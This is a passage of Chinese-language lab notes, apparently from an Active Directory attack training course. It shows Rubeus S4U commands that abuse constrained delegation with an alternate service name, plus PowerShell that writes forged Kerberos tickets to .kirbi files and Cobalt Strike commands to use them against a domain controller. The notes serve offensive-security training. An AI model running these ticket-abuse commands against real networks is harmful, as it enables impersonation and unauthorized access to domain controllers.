gAwIBAqEjMCEbBGNpZnMbGXdrc3RuLTIuZGV2LmN5YmVyYm90aWMuaW8=


```


1660352025272.png



写票据

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\cifs.kirbi" , [System.Convert]::FromBase64String( "doIGWDC....aWMuaW8="))
```

1660352469858.png

导入票据

1660352448322.png


# Alternate Service Name

申请tgs
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /ticket:doIFLDCC.....uSU8= /nowrap
```

根据上面生成的base64写tgs票据


```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\dc2-cifs.kirbi" , [System.Convert]::FromBase64String( "doIGUjCCBk6gAwIBBaEDAgE....MuaW8="))
```


1660354070932.png


导入dc2-cifs.kirbi，访问dc2的文件系统
```
make_token DEV\nlamb FakePass

kerberos_ticket_use C:\Users\Administrator\Desktop\dc2-cifs.kirbi
```

1660353939907.png